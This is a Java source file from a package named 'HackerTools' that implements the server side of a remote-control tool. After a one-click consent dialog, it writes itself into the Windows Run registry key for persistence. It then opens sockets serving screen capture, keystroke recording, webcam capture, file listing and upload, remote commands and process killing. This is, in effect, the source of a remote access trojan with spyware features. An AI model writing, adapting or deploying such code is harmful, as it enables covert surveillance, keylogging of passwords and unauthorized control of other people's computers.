package HackerTools;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.util.ArrayList;

public class Server {
    private static int port_file = 6666;
    private static int port_proc = 6667;
    private static int port_camera = 6668;// 各个线程的端口设置

    public static void main(String args[]) throws IOException {

        int res = JOptionPane.showConfirmDialog(null,
                "Do you want to be controlled?", "远程控制",
                JOptionPane.YES_NO_OPTION);
        if (res == JOptionPane.YES_OPTION) {
            System.out.println("选择是后执行的代码"); // 点击“是”后执行这个代码块
            auto_run auto_run=new auto_run(); //加入自启动
        } else {
            System.out.println("选择否后执行的代码"); // 点击“否”后执行这个代码块
            System.exit(1);
            return;
        }

        try {
            // 进程开启时自动开始图像记录
            Thread thread_screenCapture = new Thread() {
                public void run() {
                    try {
                        ServerScreenMonitor.screencapture();
                    } catch (Exception e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                }
            };
            thread_screenCapture.start(); // 新开一个线程执行屏幕记录

            Thread_Pool thread_Pool1 = new Thread_Pool("file");
            thread_Pool1.start(); // 开启文件管理线程

            Thread_Pool thread_Pool2 = new Thread_Pool("proc");
            thread_Pool2.start(); // 进程文件管理线程

            Thread_Pool thread_Pool3 = new Thread_Pool("camera");
            thread_Pool3.start(); // 摄像头管理线程

            Thread_Pool thread_Pool4 = new Thread_Pool("upload_file");
            thread_Pool4.start(); // 文件上传线程

            Thread_Pool thread_Pool5 = new Thread_Pool("screen_monitor");
            thread_Pool5.start(); // 摄像头管理线程

            Thread_Pool thread_Pool6 = new Thread_Pool("cmd");
            thread_Pool6.start(); // 摄像头管理线程

            Thread_Pool thread_Pool7 = new Thread_Pool("keyboardRecord");
            thread_Pool7.start(); // 摄像头管理线程//

            //键盘记录模块开启
            ServerKeyboardRecord ServerKeyboardRecord=new ServerKeyboardRecord();

            JOptionPane.showMessageDialog(null, "", "成功开启服务端",
                    JOptionPane.OK_OPTION);
        } catch (Exception e) {

            JOptionPane.showMessageDialog(null, "", "服务端开启失败",
                    JOptionPane.ERROR_MESSAGE);
            System.exit(1);
            return;

        } finally {

        }
    }
}

class Thread_Pool extends Thread {
    private static int port_file = 6666;
    private static int port_proc = 6667;
    private static int port_camera = 6668;
    private static int port_uploarFile = 6669;
    private static int port_cmd = 7888;
    private static int port_screenMonitor = 8000;// 各个线程的端口设置

    private String methods;

    public Thread_Pool(String methods) {
        this.methods = methods;
    }

    @Override
    public void run() {
        if (methods.equals("file")) {
            // server_FileManager类的使用
            server_FileManager server_FileManager = new server_FileManager();
            // server_FileManager.server_getFileName();
            server_FileManager.server_getRootFile();
            server_FileManager.setport(port_file);
            System.out.println("文件管理服务器的端口是：" + server_FileManager.port);
            server_FileManager.server_file_socketManager();

        } else if (methods.equals("proc")) {
            // server_ProcManager类的使用
            server_ProcManager server_ProcManager = new server_ProcManager();
            server_ProcManager.setport(port_proc);
            System.out.println("进程管理服务器的端口是：" + server_ProcManager.port);
            server_ProcManager.server_proc_socketManager();
        } else if (methods.equals("camera")) {
            server_cameraManager server_cameraManager = new server_cameraManager();
            server_cameraManager.setport(port_camera);
            System.out.println("摄像头服务器的端口是：" + server_cameraManager.port);
            server_cameraManager.server_camera_record();
        } else if (methods.equals("upload_file")) {
            server_FileReceive server_FileReceive = new server_FileReceive();
            server_FileReceive.setport(port_uploarFile);
            System.out.println("摄像头服务器的端口是：" + server_FileReceive.port);
            try {
                server_FileReceive.receive();
            } catch (ClassNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        } else if (methods.equals("screen_monitor")) {
            try {
                final ServerScreenMonitor ServerScreenMonitor = new ServerScreenMonitor(
                        port_screenMonitor);
                try {
                    ServerScreenMonitor.send();
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        } else if (methods.equals("cmd")) {
            ServerCmd ServerCmd = new ServerCmd(port_cmd);
            try {
                ServerCmd.sendresult();
            } catch (UnknownHostException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        else if (methods.equals("keyboardRecord")){
            send_keybord send_keybord=new send_keybord();
            send_keybord.setport(8886);
            send_keybord.run();
        }
    }
}

class fileButton {

    private JButton button;
    private JFrame frame;
    private Container container;

    public Void fileButton(JButton button, final JFrame frame) {
        File file = new File("E:\\4399");
        // this.listFile();

        this.button = button;
        this.frame = frame;
        this.frame.setLayout(null);
        this.container = frame.getContentPane();
        this.initialization(frame);

        return null;
    }

    public Void initialization(final JFrame frame1) {

        this.button.setBounds(40, 100, 300, 40);
        this.button.setHorizontalAlignment(SwingConstants.CENTER);

        this.container.add(this.button);
        this.container.setBackground(Color.white);
        this.container.setBounds(0, 0, 400, 300);

        this.button.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {

                /*
                 * JFileChooser fileChooser = new JFileChooser();
                 * fileChooser.showOpenDialog(frame1.getContentPane());
                 *
                 * int i = 0; if (i == JFileChooser.APPROVE_OPTION) { File
                 * selectedFile = fileChooser.getSelectedFile();
                 * System.out.print(selectedFile.getName()); }
                 */
            }
        });

        return null;
    }

    /*
     * public static void listFile() {
     * System.out.println("=========指定目录下的所有文件夹=========="); File fileDirectory
     * = new File("E:\\"); File[] aa = fileDirectory.listFiles(); for (int i =
     * 0; i < aa.length; i++) { if (aa[i].isDirectory()) {
     * System.out.println(aa[i].toString()); } }
     * System.out.println("=========指定目录下的所有文件=========="); File file = new
     * File("E:\\"); File[] bb = file.listFiles(); for (int j = 0; j <
     * bb.length; j++) { if (bb[j].isFile()) { System.out.println(bb[j]); } } }
     */

}

class server_FileManager {
    public ArrayList<String> fileDirectory_list = new ArrayList<String>();
    public ArrayList<String> file_list = new ArrayList<String>();
    public int port;
    public static String route;

    public void setport(int port) {
        this.port = port;
    }

    public void server_getRootFile() {
        this.fileDirectory_list = new ArrayList<String>();
        this.file_list = new ArrayList<String>();
        /*
         * for (File f : FileSystemView.getFileSystemView().getHomeDirectory()
         * .listFiles()) { // 获取“我的电脑”文件对象 if
         * (f.getName().equals("::{20D04FE0-3AEA-1069-A2D8-08002B30309D}")) {
         * for (File sf : f.listFiles()) { System.out.println(sf.getPath()); } }
         * }
         */// 这个可以获取更多的信息，比如除了磁盘驱动器之外根目录下的其他设备

        File[] root = File.listRoots();

        for (File file : root) {
            this.fileDirectory_list.add(file.getAbsolutePath().toString());
        }
        System.out.println(fileDirectory_list);

    }

    public void server_getFileName() {
        this.fileDirectory_list = new ArrayList<String>();
        this.file_list = new ArrayList<String>();

        File fileDirectory = new File(route);
        File[] aa = fileDirectory.listFiles();

        for (int i = 0; i < aa.length; i++) {
            if (aa[i].isDirectory()) {
                this.fileDirectory_list.add(aa[i].toString());
            }
        }// 逐一读取目录
        this.fileDirectory_list.sort(null);// 对得到的目录排序

        File file = new File(route);
        File[] bb = file.listFiles();
        for (int j = 0; j < bb.length; j++) {
            if (bb[j].isFile()) {
                this.file_list.add(bb[j].toString());
            }
        }// 逐一读取文件
        this.file_list.sort(null);// 对得到的文件排序
    }

    public void server_file_socketManager() {
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(port);
            serverSocket.setSoTimeout(300000);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (true) {
                try {
                    System.out.println("等待远程连接，端口号为："
                            + serverSocket.getLocalPort() + "...");
                    Socket server = serverSocket.accept();
                    System.out.println("远程主机地址："
                            + server.getRemoteSocketAddress());
                    DataInputStream in = new DataInputStream(
                            server.getInputStream());
                    String cache = in.readUTF().toString();
                    if (cache.equals("File_check")) {
                        server_getRootFile();
                        System.out.println(this.fileDirectory_list + "22222");
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());
                        fileDirectory_list.addAll(file_list);
                        out.writeObject(this.fileDirectory_list);
                    } else {
                        route = cache;
                        server_getFileName();
                        System.out.println(this.fileDirectory_list + "22222");
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());
                        fileDirectory_list.addAll(file_list);
                        out.writeObject(this.fileDirectory_list);
                    }
                    serverSocket.setSoTimeout(300000);
                    server.close();
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }

}

class server_FileReceive {
    public String directory = "";
    public File file;
    public int port;
    public int count = 0;

    public void setport(int port) {
        this.port = port;
    }

    public void receive() throws ClassNotFoundException {
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(port);
            serverSocket.setSoTimeout(300000);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (true) {
                try {
                    File cache = new File(server_FileManager.route + count);
                    while (cache.exists() && cache.isFile()) {
                        count = count + 1;
                        cache = new File(server_FileManager.route + count);
                    }
                    System.out.println("等待远程连接，端口号为："
                            + serverSocket.getLocalPort() + "...");
                    Socket server = serverSocket.accept();
                    System.out.println("远程主机地址："
                            + server.getRemoteSocketAddress());
                    InputStream in = server.getInputStream();
                    FileOutputStream fos = new FileOutputStream(
                            server_FileManager.route + count);
                    int len;
                    byte[] bs = new byte[1024];
                    while ((len = in.read(bs)) != -1) {
                        fos.write(bs, 0, len);
                    }
                    OutputStream out = server.getOutputStream();
                    fos.close();
                    in.close();
                    out.close();
                    serverSocket.setSoTimeout(300000);
                    server.close();
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }

}

class server_ProcManager {
    public ArrayList<String[]> proc_list = new ArrayList<String[]>();
    public int port;

    public void setport(int port) {
        this.port = port;
    }

    public void server_getProcName() {

        try {
            // 先清空成员变量
            proc_list = new ArrayList<String[]>();

            // 先创建系统进程
            ProcessBuilder pb = new ProcessBuilder("tasklist");
            Process p = null;
            p = pb.start();
            BufferedReader out = new BufferedReader(new InputStreamReader(
                    new BufferedInputStream(p.getInputStream()),
                    Charset.forName("GB2312")));
            BufferedReader err = new BufferedReader(new InputStreamReader(
                    new BufferedInputStream(p.getErrorStream())));
            System.out.println("Window 系统进程列表");
            String ostr;

            // 输出本地进程
            int line = 0;
            while ((ostr = out.readLine()) != null) {
                if (line != 2 && line != 3)// 去除第二、三行的不需要部分
                {

                    String[] cacheStrings = ostr.split("\\s{1,}", 5); // 第一行为表格头部，用一个空格分割
                    this.proc_list.add(cacheStrings);

                }
                line++;
            }
            this.proc_list.remove(0);// 去除第一个不必要的元素
            /*
             * for (int j = 1; j < this.proc_list.size() - 1; j++) { for (int i
             * = 0; i < this.proc_list.size() - 1 - j; i++) { if
             * (this.proc_list.get(i)[0].compareTo(this.proc_list .get(i +
             * 1)[0]) > 0) { // change final List l = this.proc_list; l.set(i,
             * l.set(j + 1, l.get(i))); } } }
             */

            String estr = null;

            // 如果有，则输出错误信息
            try {
                estr = err.readLine();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            if (estr != null) {
                System.out.println("\nError Info");
                System.out.println(estr);
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }

    public void server_proc_socketManager() {
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(port);
            serverSocket.setSoTimeout(300000);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (true) {
                try {
                    System.out.println("等待远程连接，端口号为："
                            + serverSocket.getLocalPort() + "...");
                    Socket server = serverSocket.accept();
                    System.out.println("远程主机地址："
                            + server.getRemoteSocketAddress());
                    DataInputStream in = new DataInputStream(
                            server.getInputStream());
                    String cache = in.readUTF().toString();
                    /* 刷新操作 */
                    if (cache.equals("refresh")) {
                        server_getProcName();// 先再次获取本地进程，刷新数据
                        // 将数据传输给对方
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());
                        out.writeObject(this.proc_list);
                    }
                    /* 刷新操作 */
                    /* 删除操作 */
                    else {
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());

                        Process process = null;
                        BufferedReader reader = null;
                        try { // 杀掉进程 process =

                            Runtime.getRuntime().exec(
                                    "taskkill /F /PID " + cache);
                            /*
                             * reader = new BufferedReader(new
                             * InputStreamReader( process.getInputStream()));
                             * String line = null; while ((line =
                             * reader.readLine()) != null) { System.out
                             * .println("kill PID return info -----> " + line);
                             * }
                             */
                            out.writeObject("200");
                        } catch (Exception e) {
                            e.printStackTrace();
                        } finally {
                            if (process != null) {
                                process.destroy();
                            }
                            if (reader != null) {
                                try {
                                    reader.close();
                                } catch (IOException e) {

                                }
                            }
                        }

                        System.out.println(cache);
                    }
                    /* 删除操作 */
                    serverSocket.setSoTimeout(300000);
                    server.close();
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }

}

class server_cameraManager {
    public ArrayList<String[]> proc_list = new ArrayList<String[]>();
    public int port;
    public int picNum;

    public void setport(int port) {
        this.port = port;
    }

    public void server_camera_record() {
        try {
            GetCamera.cameraTest();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}

class auto_run{
    static String name= null;
    static String path= null;

    public auto_run() throws IOException{
        System.out.println("将加本文件加入自启动："+"server.jar");
        name="server.jar";
        File file=new File(".");
        path=file.getCanonicalPath()+"\\";
        System.out.println(path);
        String regKey = "\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"";
        Runtime.getRuntime().exec("reg "+"add "+regKey+" /v "+name+" /t reg_sz /d "+path);
    }

}

